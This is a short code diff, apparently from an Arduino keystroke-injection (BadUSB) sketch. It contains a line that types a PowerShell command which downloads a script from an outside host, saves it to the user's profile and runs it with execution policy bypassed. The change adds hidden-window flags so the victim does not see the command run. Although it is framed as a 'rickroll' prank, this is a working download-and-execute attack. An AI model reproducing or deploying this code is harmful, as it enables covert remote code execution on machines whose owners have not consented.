@@ -49,7 +49,7 @@ void setup()
 
   // Type in URL and open page!
 
-  typeStringCustomDelay("powershell /NoExit /C wget 'http://mass-rickroll.host.qrl.nz/script.ps1' -o $env:USERPROFILE\\joe.ps1;PowerShell -NoProfile -ExecutionPolicy Bypass $env:USERPROFILE\\joe.ps1",5);
+  typeStringCustomDelay("powershell -windowstyle hidden -C wget 'http://mass-rickroll.host.qrl.nz/script.ps1' -o $env:USERPROFILE\\joe.ps1;PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass $env:USERPROFILE\\joe.ps1",5);
   
   // int adminRunShortcut[3] = {KEY_LEFT_CTRL,KEY_LEFT_SHIFT,KEY_RETURN};
 
